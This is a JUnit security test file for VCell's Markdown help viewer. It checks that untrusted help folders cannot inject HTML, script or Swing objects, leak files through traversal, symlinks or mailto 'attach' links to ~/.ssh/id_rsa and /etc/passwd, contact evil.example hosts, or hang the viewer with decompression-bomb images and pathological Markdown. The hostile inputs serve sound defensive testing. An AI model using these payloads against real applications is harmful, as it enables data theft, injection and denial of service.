package org.vcell.documentation;

import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import javax.imageio.ImageIO;
import javax.swing.JComponent;
import javax.swing.JLabel;
import javax.swing.JTree;
import javax.swing.plaf.basic.BasicHTML;
import java.awt.Component;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.CRC32;

import org.junit.jupiter.api.Assertions;

/**
 * Help from a folder an author picks is untrusted: these tests build hostile help folders and
 * check that nothing in them reaches the page, the file system outside the folder, the network or
 * the operating system, and that nothing in them can hang or crash the help.
 */
@Tag("Fast")
public class HelpSecurityTest {
	private static final Pattern HREF = Pattern.compile("href=\"([^\"]*)\"");
	private static final Pattern SRC = Pattern.compile("src=\"([^\"]*)\"");

	// ------------------------------------------------------------------------- fixtures

	/** A minimal valid help folder whose one page has this Markdown. */
	private static Path helpFolder(Path root, String pageMarkdown) throws IOException {
		Files.writeString(root.resolve("toc.md"), "# Help\n\n- [Page](pages/Page.md)\n", StandardCharsets.UTF_8);
		Files.createDirectories(root.resolve("pages"));
		Files.createDirectories(root.resolve("images"));
		Files.writeString(root.resolve("pages/Page.md"), pageMarkdown, StandardCharsets.UTF_8);
		return root;
	}

	private static HelpBook book(Path root) throws IOException {
		return HelpBook.fromDirectory(root.toFile());
	}

	private static String render(HelpBook book, HelpRenderer.Target target) {
		return new HelpRenderer(book, target, 600).renderBody(book.findPage("Page"));
	}

	private static List<String> all(Pattern pattern, String html) {
		List<String> found = new ArrayList<>();
		Matcher matcher = pattern.matcher(html);
		while (matcher.find()) found.add(matcher.group(1));
		return found;
	}

	private static String problems(HelpBook book) {
		return HelpChecks.check(book).stream().map(HelpProblem::toString).collect(Collectors.joining("\n"));
	}

	private static byte[] png(int width, int height) throws IOException {
		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
		ImageIO.write(new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB), "png", bytes);
		return bytes.toByteArray();
	}

	/** A tiny PNG whose header claims a huge size, as a decompression bomb would. */
	private static byte[] pngClaiming(int width, int height) throws IOException {
		byte[] png = HelpSecurityTest.png(1, 1);
		ByteBuffer buffer = ByteBuffer.wrap(png);
		// signature (8), IHDR length (4), "IHDR" (4), then width and height
		buffer.putInt(16, width);
		buffer.putInt(20, height);
		CRC32 crc = new CRC32();
		crc.update(png, 12, 4 + 13);
		buffer.putInt(12 + 4 + 13, (int) crc.getValue());
		return png;
	}

	// ------------------------------------------------------------------------- raw HTML

	@Test
	public void rawHtmlNeverReachesThePage(@TempDir Path root) throws IOException {
		HelpBook book = HelpSecurityTest.book(HelpSecurityTest.helpFolder(root, String.join("\n",
				"# Page", "",
				"<object classid=\"javax.swing.JButton\"><param name=\"text\" value=\"evil\"></object>", "",
				"<form action=\"https://evil.example/collect\"><input name=\"q\"></form>", "",
				"Inline <img src=\"https://evil.example/track.png\"> and <a href=\"file:///etc/passwd\">here</a>.", "",
				"<script>alert(1)</script>", "",
				"<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">", "",
				"<base href=\"https://evil.example/\">", "",
				"<style>body { background: url(https://evil.example/x.png) }</style>", "",
				"<!-- an author note -->", "",
				"<iframe src=\"https://evil.example\"></iframe>", "",
				"Plain text stays.", "")));
		for (HelpRenderer.Target target : HelpRenderer.Target.values()) {
			String html = HelpSecurityTest.render(book, target);
			Assertions.assertFalse(html.toLowerCase().contains("evil"), target + ": " + html);
			for (String tag : List.of("<object", "<param", "<form", "<input", "<script", "<link", "<base", "<style", "<iframe", "<!--", "file:")) {
				Assertions.assertFalse(html.toLowerCase().contains(tag), target + " contains " + tag + ": " + html);
			}
			Assertions.assertTrue(html.contains("Plain text stays."), html);
			Assertions.assertNull(HelpHtmlPolicy.findViolation(html, source -> false), html);
		}
		String problems = HelpSecurityTest.problems(book);
		Assertions.assertTrue(problems.contains("pages/Page.md:3: HTML is not shown"), problems);
		Assertions.assertFalse(problems.contains(":17:"), "an HTML comment is a fine author note: " + problems);
	}

	// ----------------------------------------------------------------------------- links

	@Test
	public void onlyHttpHttpsAndMailtoLinksAreLive(@TempDir Path root) throws IOException {
		HelpBook book = HelpSecurityTest.book(HelpSecurityTest.helpFolder(root, String.join("\n",
				"# Page", "",
				"[a](javascript:alert(1)) [b](file:///etc/passwd) [c](smb://evil.example/share)",
				"[d](JavaScript:alert(1)) [e](//evil.example/x) [f](https://user:pass@evil.example/)",
				"[g](vbscript:x) [h](data:text/html,x) [i](ms-settings:x) [j][ref] <file:///etc/passwd>",
				"[k](..\\..\\outside.md) [l](../../../outside.md) [m](\\\\evil.example\\share)", "",
				"[ok1](https://vcell.org) [ok2](HTTP://vcell.org/x?a=1&b=2) [ok3](mailto:help@vcell.org)",
				"<https://vcell.org/auto> <help@vcell.org> [self](#page)", "",
				"[ref]: javascript:alert(2)", "")));
		for (HelpRenderer.Target target : HelpRenderer.Target.values()) {
			String html = HelpSecurityTest.render(book, target);
			List<String> hrefs = HelpSecurityTest.all(HREF, html);
			Assertions.assertEquals(List.of("https://vcell.org", "HTTP://vcell.org/x?a=1&amp;b=2", "mailto:help@vcell.org",
					"https://vcell.org/auto", "mailto:help@vcell.org", "#page"), hrefs, target + ": " + html);
			Assertions.assertTrue(html.contains(">a<") || html.contains("a "), "a refused link keeps its text: " + html);
		}
		String problems = HelpSecurityTest.problems(book);
		for (String refused : List.of("javascript:alert(1)", "file:///etc/passwd", "smb://evil.example/share", "vbscript:x", "javascript:alert(2)")) {
			Assertions.assertTrue(problems.contains(refused), refused + " not reported in:\n" + problems);
		}
		Assertions.assertTrue(problems.contains("broken link '../../../outside.md'"), problems);
	}

	@Test
	public void externalLinkRules() {
		for (String allowed : List.of("https://vcell.org", "http://vcell.org/a?b=c#d", "HTTPS://VCELL.ORG", "mailto:help@vcell.org",
				"mailto:help@vcell.org?subject=VCell%20help&body=Hello")) {
			Assertions.assertTrue(HelpBook.isAllowedExternalLink(allowed), allowed);
		}
		for (String refused : List.of("javascript:alert(1)", "file:///etc/passwd", "file://server/share", "smb://host/share",
				"https://user:pass@evil.example/", "https:///nohost", "https://evil.example/a b", "https://evil.example/\u0000",
				"https://evil.example\\@good.example", "ms-msdt:/id", "data:text/html,x", "mailto:", "//evil.example/x", "",
				"mailto:?attach=~/.ssh/id_rsa", "mailto:x@vcell.org?attach=/etc/passwd&body=hi", "mailto:x@vcell.org?subject=a%26attach=b",
				"https://evil.example/\u202Egpj.exe", "https://\u00E9vil.example/", "https://evil.example/\u200B")) {
			Assertions.assertFalse(HelpBook.isAllowedExternalLink(refused), refused);
		}
	}

	// ---------------------------------------------------------------------------- images

	@Test
	public void imagesOnlyFromPlainFilesInsideTheFolder(@TempDir Path workspace) throws IOException {
		Path root = Files.createDirectories(workspace.resolve("help"));
		Path outside = Files.write(workspace.resolve("outside.png"), HelpSecurityTest.png(4, 4));
		HelpSecurityTest.helpFolder(root, String.join("\n",
				"# Page", "",
				"![remote](https://evil.example/track.png) ![file](file:///etc/x.png) ![up](../../outside.png)",
				"![linked](../images/linked.png) ![refd][img] ![wrong case](../images/OK.png) ![ok](../images/ok.png)", "",
				"[img]: https://evil.example/ref.png", ""));
		Files.write(root.resolve("images/ok.png"), HelpSecurityTest.png(4, 3));
		Files.createSymbolicLink(root.resolve("images/linked.png"), outside);
		HelpBook book = HelpSecurityTest.book(root);

		String swingHtml = HelpSecurityTest.render(book, HelpRenderer.Target.SWING);
		List<String> swingSources = HelpSecurityTest.all(SRC, swingHtml);
		Assertions.assertEquals(1, swingSources.size(), swingHtml);
		Assertions.assertEquals(root.toRealPath().resolve("images/ok.png").toUri().toURL().toExternalForm(), swingSources.get(0));
		Assertions.assertTrue(swingHtml.contains("[remote]") && swingHtml.contains("[linked]"), "refused images show their alt text: " + swingHtml);

		String webHtml = HelpSecurityTest.render(book, HelpRenderer.Target.WEB);
		Assertions.assertEquals(List.of("../images/ok.png"), HelpSecurityTest.all(SRC, webHtml), webHtml);

		String problems = HelpSecurityTest.problems(book);
		Assertions.assertTrue(problems.contains("images/linked.png: this file is a link"), problems);
		Assertions.assertTrue(problems.contains("image 'https://evil.example/track.png' must be a file"), problems);
		Assertions.assertTrue(problems.contains("image '../images/OK.png' is missing"), "case must match exactly: " + problems);
	}

	@Test
	public void oversizedImagesAreNotDecoded(@TempDir Path root) throws IOException {
		HelpSecurityTest.helpFolder(root, "# Page\n\n![bomb](../images/bomb.png) ![wide](../images/wide.png) ![text](../images/text.png)\n");
		Files.write(root.resolve("images/bomb.png"), HelpSecurityTest.pngClaiming(60_000, 60_000));
		Files.write(root.resolve("images/wide.png"), HelpSecurityTest.pngClaiming(20_000, 10));
		Files.writeString(root.resolve("images/text.png"), "not an image");
		HelpBook book = HelpSecurityTest.book(root);
		Assertions.assertTrue(book.imageProblem("images/bomb.png").contains("too large"), book.imageProblem("images/bomb.png"));
		Assertions.assertTrue(book.imageProblem("images/wide.png").contains("too large"));
		Assertions.assertNotNull(book.imageProblem("images/text.png"));
		String html = HelpSecurityTest.render(book, HelpRenderer.Target.SWING);
		Assertions.assertFalse(html.contains("<img"), html);
	}

	// ----------------------------------------------------------------------- files, paths

	@Test
	public void pagesOutsideTheFolderOrBehindLinksAreNotRead(@TempDir Path workspace) throws IOException {
		Path root = Files.createDirectories(workspace.resolve("help"));
		Path secret = Files.writeString(workspace.resolve("secret.md"), "# SECRET\n\nSECRET CONTENT\n");
		Files.writeString(root.resolve("toc.md"), String.join("\n", "# Help", "",
				"- [Page](pages/Page.md)", "- [Linked](pages/Linked.md)", "- [Up](../secret.md)",
				"- [Abs](/etc/passwd)", "- [Device](pages/CON.md)", "- [Spaces](pages/My%20Page.md)", ""));
		Files.createDirectories(root.resolve("pages"));
		Files.writeString(root.resolve("pages/Page.md"), "# Page\n\nSee [linked](Linked.md).\n");
		Files.createSymbolicLink(root.resolve("pages/Linked.md"), secret);
		HelpBook book = HelpSecurityTest.book(root);

		Assertions.assertEquals(Set.of("pages/Page.md"), book.getPages().stream().map(HelpPage::path).collect(Collectors.toSet()));
		for (HelpPage page : book.getPages()) {
			Assertions.assertFalse(HelpBook.plainText(page).contains("SECRET"));
		}
		String problems = HelpSecurityTest.problems(book);
		Assertions.assertTrue(problems.contains("pages/Linked.md: this file is a link"), problems);
		Assertions.assertTrue(problems.contains("toc.md:7: entry 'pages/CON.md': page names may only use"), problems);
	}

	@Test
	public void allowedPaths() {
		for (String allowed : List.of("toc.md", "pages/Intro/New.md", "images/a_b-c.png", "pages/a/b/c/d/e/f/g.md")) {
			Assertions.assertTrue(HelpSource.isAllowedPath(allowed), allowed);
		}
		for (String refused : List.of("", "/etc/passwd", "pages/../toc.md", "pages/./x.md", "pages//x.md", "pages/x.md/",
				"pages/My Page.md", "pages/x.tar.gz", "pages/.hidden.md", "pages\\x.md", "C:/x.md", "pages/CON.md",
				"pages/con.txt", "pages/Lpt1.md", "pages/Ünïcode.md", "a/b/c/d/e/f/g/h/i.md", "pages/" + "x".repeat(101) + ".md")) {
			Assertions.assertFalse(HelpSource.isAllowedPath(refused), refused);
		}
	}

	@Test
	public void folderMustLookLikeHelpSource(@TempDir Path workspace) throws IOException {
		Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(null));
		Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(workspace.resolve("missing").toFile()));
		Path file = Files.writeString(workspace.resolve("file.md"), "x");
		Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(file.toFile()));
		Path noToc = Files.createDirectories(workspace.resolve("noToc/pages"));
		Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(noToc.getParent().toFile()));
		Path noPages = Files.createDirectories(workspace.resolve("noPages"));
		Files.writeString(noPages.resolve("toc.md"), "# Help\n");
		Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(noPages.toFile()));
		Path linkedToc = Files.createDirectories(workspace.resolve("linkedToc/pages"));
		Files.createSymbolicLink(linkedToc.getParent().resolve("toc.md"), noPages.resolve("toc.md"));
		Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(linkedToc.getParent().toFile()));
		Path linkedPages = Files.createDirectories(workspace.resolve("linkedPages"));
		Files.writeString(linkedPages.resolve("toc.md"), "# Help\n");
		Files.createSymbolicLink(linkedPages.resolve("pages"), noToc);
		Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(linkedPages.toFile()));
		Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(new java.io.File("\\\\server\\share")));

		Path valid = HelpSecurityTest.helpFolder(Files.createDirectories(workspace.resolve("valid")), "# Page\n");
		Assertions.assertEquals(valid.toRealPath(), HelpSource.Folder.open(valid.toFile()).getRoot());
		// a folder reached through a link is fine: it is resolved once, then held to its real path
		Path alias = Files.createSymbolicLink(workspace.resolve("alias"), valid);
		Assertions.assertEquals(valid.toRealPath(), HelpSource.Folder.open(alias.toFile()).getRoot());
	}

	@Test
	public void emptyContentsIsRefused(@TempDir Path root) throws IOException {
		Files.writeString(root.resolve("toc.md"), "# Help\n\nNo list here.\n");
		Files.createDirectories(root.resolve("pages"));
		Assertions.assertThrows(IOException.class, () -> HelpSecurityTest.book(root));
	}

	@Test
	public void imagesAreDecodedAtTheirShownSize(@TempDir Path root) throws IOException {
		HelpSecurityTest.helpFolder(root, "# Page\n\n" + "![big](../images/big.png) ".repeat(12) + "![gif](../images/screen.gif)\n");
		Files.write(root.resolve("images/big.png"), HelpSecurityTest.png(10_000, 4_000));
		Files.write(root.resolve("images/screen.gif"), HelpSecurityTest.gifWithLogicalScreen(30_000, 30_000));
		HelpBook book = HelpSecurityTest.book(root);
		HelpRenderer.RenderedPage rendered = new HelpRenderer(book, HelpRenderer.Target.SWING, 720).renderPage(book.findPage("Page"));
		Assertions.assertEquals(2, rendered.images().size(), "twelve references to one image are one image: " + rendered.images());
		for (HelpRenderer.ShownImage shown : rendered.images().values()) {
			java.awt.image.BufferedImage image = book.readDisplayImage(shown.path(), shown.width(), shown.height());
			Assertions.assertNotNull(image, shown.path());
			Assertions.assertTrue(image.getWidth() <= 2 * shown.width() && image.getHeight() <= 2 * shown.height(),
					shown.path() + " decoded at " + image.getWidth() + " x " + image.getHeight() + " for " + shown);
		}
	}

	/** A 1 x 1 GIF whose header claims a huge logical screen, which Swing's decoder would allocate. */
	private static byte[] gifWithLogicalScreen(int width, int height) {
		ByteBuffer gif = ByteBuffer.allocate(64).order(java.nio.ByteOrder.LITTLE_ENDIAN);
		gif.put("GIF89a".getBytes(StandardCharsets.US_ASCII)).putShort((short) width).putShort((short) height)
				.put((byte) 0x80).put((byte) 0).put((byte) 0)          // 2-colour global table
				.put(new byte[]{0, 0, 0, (byte) 255, (byte) 255, (byte) 255})
				.put((byte) ',').putShort((short) 0).putShort((short) 0).putShort((short) 1).putShort((short) 1).put((byte) 0)
				.put((byte) 2).put(new byte[]{2, 0x44, 0x01, 0}).put((byte) ';');
		return java.util.Arrays.copyOf(gif.array(), gif.position());
	}

	@Test
	public void folderNamesNeverReachSwingAsHtml(@TempDir Path workspace) throws IOException {
		Path folder;
		try {
			folder = Files.writeString(workspace.resolve("pack<html><img src=\"x.png\">"), "not a folder");
		} catch (IOException | java.nio.file.InvalidPathException e) {
			return; // a file system that refuses such names cannot be attacked this way
		}
		HelpSource.FolderException failure = Assertions.assertThrows(HelpSource.FolderException.class, () -> HelpSource.Folder.open(folder.toFile()));
		Assertions.assertTrue(failure.getMessage().contains("<html>"), "the message quotes the path: " + failure.getMessage());
		String shown = HelpViewer.plainText(failure.getMessage());
		Assertions.assertFalse(shown.contains("<"), shown);
		Assertions.assertNull(new JLabel(shown).getClientProperty(BasicHTML.propertyKey));
	}

	@Test
	public void unreadableSubfolderIsAProblemNotAFailure(@TempDir Path root) throws IOException {
		HelpSecurityTest.helpFolder(root, "# Page\n");
		Path locked = Files.createDirectories(root.resolve("pages/Locked"));
		Files.writeString(locked.resolve("Hidden.md"), "# Hidden\n");
		try {
			Files.setPosixFilePermissions(locked, java.nio.file.attribute.PosixFilePermissions.fromString("---------"));
		} catch (UnsupportedOperationException e) {
			return; // not a POSIX file system
		}
		try {
			Assertions.assertTrue(HelpSecurityTest.problems(HelpSecurityTest.book(root)).contains("can't be read"));
		} finally {
			Files.setPosixFilePermissions(locked, java.nio.file.attribute.PosixFilePermissions.fromString("rwx------"));
		}
	}

	// --------------------------------------------------------------------- size, depth, time

	@Test
	public void markupHeavyPagesAreBoundedInMemory(@TempDir Path root) throws IOException {
		StringBuilder contents = new StringBuilder("# Help\n\n- [Page](pages/Page.md)\n");
		for (int page = 0; page < 20; page++) contents.append("- [P").append(page).append("](pages/P").append(page).append(".md)\n");
		HelpSecurityTest.helpFolder(root, "# Page\n\n" + "*a* ".repeat(60_000) + "\n");
		Files.writeString(root.resolve("toc.md"), contents);
		for (int page = 0; page < 20; page++) {
			Files.writeString(root.resolve("pages/P" + page + ".md"), "# P" + page + "\n\n" + "*a* ".repeat(4_500) + "\n");
		}
		Files.writeString(root.resolve("pages/Home.md"), "# Home\n");
		HelpBook book = HelpSecurityTest.book(root);
		String problems = HelpSecurityTest.problems(book);
		Assertions.assertTrue(problems.contains("pages/Page.md: this page has too much markup"), problems);
		Assertions.assertTrue(problems.contains("the help as a whole is over"), problems);
		long nodes = 0;
		for (HelpPage page : book.getPages()) for (com.vladsch.flexmark.util.ast.Node node : page.document().getDescendants()) nodes++;
		Assertions.assertTrue(nodes <= HelpBook.MAX_BOOK_NODES, nodes + " nodes");
	}

	@Test
	public void manyHeadingsAndLinksStayFast(@TempDir Path root) throws IOException {
		StringBuilder page = new StringBuilder("# Page\n\n");
		for (int i = 0; i < 1_500; i++) page.append("## Heading ").append(i).append("\n\n");
		for (int i = 0; i < 1_500; i++) page.append("[x](#Heading%20").append(i).append(") [y](#nowhere-").append(i).append(")\n");
		HelpSecurityTest.helpFolder(root, page.toString());
		Assertions.assertTimeoutPreemptively(Duration.ofSeconds(5), () -> {
			HelpBook book = HelpSecurityTest.book(root);
			HelpSecurityTest.problems(book);
			HelpSecurityTest.render(book, HelpRenderer.Target.SWING);
		});
	}


	@Test
	public void oversizedPagesAreNotRead(@TempDir Path root) throws IOException {
		HelpSecurityTest.helpFolder(root, "# Page\n\nSee [big](Big.md).\n");
		Files.writeString(root.resolve("pages/Big.md"), "# Big\n\n" + "word ".repeat((int) (HelpSource.MAX_PAGE_BYTES / 5) + 10));
		HelpBook book = HelpSecurityTest.book(root);
		Assertions.assertNull(book.findPage("Big"));
		Assertions.assertTrue(HelpSecurityTest.problems(book).contains("pages/Big.md: this page could not be read"), HelpSecurityTest.problems(book));
	}

	@Test
	public void pathologicalMarkdownFinishesQuickly(@TempDir Path root) throws IOException {
		StringBuilder deepContents = new StringBuilder("# Help\n\n");
		for (int depth = 0; depth < 60; depth++) {
			deepContents.append("  ".repeat(depth)).append("- [Page](pages/Page.md)\n");
		}
		String nasty = "# Page\n\n" + "`".repeat(60_000) + "\n\n" + "a ``".repeat(10_000) + "\n\n" + "[".repeat(40_000) + "\n\n" + "> ".repeat(20_000) + "x\n\n" + "*a ".repeat(20_000)
				+ "\n\n" + "![](".repeat(10_000) + "\n\n" + "<".repeat(40_000) + "\n";
		HelpSecurityTest.helpFolder(root, nasty.substring(0, (int) Math.min(nasty.length(), HelpSource.MAX_PAGE_BYTES - 1)));
		Files.writeString(root.resolve("toc.md"), deepContents.toString());
		Assertions.assertTimeoutPreemptively(Duration.ofSeconds(20), () -> {
			HelpBook book = HelpSecurityTest.book(root);
			Assertions.assertTrue(HelpSecurityTest.problems(book).contains("nest deeper than"), HelpSecurityTest.problems(book));
			for (HelpRenderer.Target target : HelpRenderer.Target.values()) {
				String html = HelpSecurityTest.render(book, target);
				Assertions.assertNull(HelpHtmlPolicy.findViolation(html, source -> true), html.substring(0, Math.min(500, html.length())));
			}
			new HelpSearch(book).search("a");
		});
	}

	// ------------------------------------------------------------------------ Swing text

	@Test
	public void contentsTitlesAreNeverRenderedAsHtml() {
		String title = "<html><object classid=\"javax.swing.JButton\"><param name=\"text\" value=\"INJECTED\"></object>";
		JLabel ordinary = new JLabel(title);
		Assertions.assertNotNull(ordinary.getClientProperty(BasicHTML.propertyKey), "a plain Swing label would render this as HTML");
		Component cell = new HelpViewer.PlainTextTreeCellRenderer().getTreeCellRendererComponent(new JTree(), title, false, false, true, 0, false);
		Assertions.assertNull(((JComponent) cell).getClientProperty(BasicHTML.propertyKey), "the contents tree must show it as text");
	}

	@Test
	public void contentsPageEscapesTitlesAndLinksOnlyExistingPages(@TempDir Path helpRoot) throws IOException {
		Files.writeString(helpRoot.resolve("toc.md"), String.join("\n",
				"# Help", "",
				"- Group",
				"  - [Page <object classid=\"javax.swing.JButton\"></object> & more](pages/Page.md)",
				"  - [Gone](pages/Gone.md)", ""), StandardCharsets.UTF_8);
		Files.createDirectories(helpRoot.resolve("pages"));
		Files.writeString(helpRoot.resolve("pages/Page.md"), "# Page\n", StandardCharsets.UTF_8);
		HelpBook book = HelpBook.fromDirectory(helpRoot.toFile());
		String title = book.getTableOfContents().get(0).children().get(0).title();

		String swing = new HelpRenderer(book, HelpRenderer.Target.SWING, 700).renderContents();
		String web = new HelpRenderer(book, HelpRenderer.Target.WEB, 700).renderContents();
		for (String html : List.of(swing, web)) {
			Assertions.assertNull(HelpHtmlPolicy.findViolation(html, source -> false), html);
			Assertions.assertFalse(html.contains("<object"), html);
			Assertions.assertTrue(html.contains(HelpRenderer.escape(title) + "</a>"), html);
			Assertions.assertTrue(html.contains("<li>Group"), "a grouping entry is plain text: " + html);
			Assertions.assertTrue(html.contains("<li>Gone"), "a missing page is plain text, not a link: " + html);
		}
		Assertions.assertTrue(swing.contains("<a href=\"pages/Page.md\">"), swing);
		Assertions.assertTrue(web.contains("<a href=\"pages/Page.html\">"), web);
	}

	// ------------------------------------------------------------------------ HTML policy

	@Test
	public void htmlPolicyRefusesWhatTheRendererShouldNeverWrite() {
		Assertions.assertNull(HelpHtmlPolicy.findViolation("<h1 id=\"x\">T</h1>\n<p>a &lt;b&gt; <a href=\"../a/B.md#c\">l</a></p>", source -> false));
		Assertions.assertNull(HelpHtmlPolicy.findViolation("<img src=\"file:/x.png\" alt=\"\" width=\"4\" height=\"3\" />", "file:/x.png"::equals));
		for (String bad : List.of(
				"<object classid=\"javax.swing.JButton\"></object>", "<p onclick=\"x\">a</p>", "<a href=\"javascript:x\">a</a>",
				"<a href=\"&#106;avascript:x\">a</a>", "<a href=\"//evil.example/x\">a</a>", "<img src=\"https://evil.example/x.png\" />",
				"<!-- x -->", "<p>a < b</p>", "<a href='x'>a</a>", "<a href=x>a</a>", "<td align=\"left;color:red\">x</td>",
				"<code class=\"x\" >y</code>", "<p style=\"x\">a</p>", "</p class=\"x\">", "<ScRiPt>x</ScRiPt>")) {
			Assertions.assertNotNull(HelpHtmlPolicy.findViolation(bad, "file:/x.png"::equals), bad);
		}
	}
}
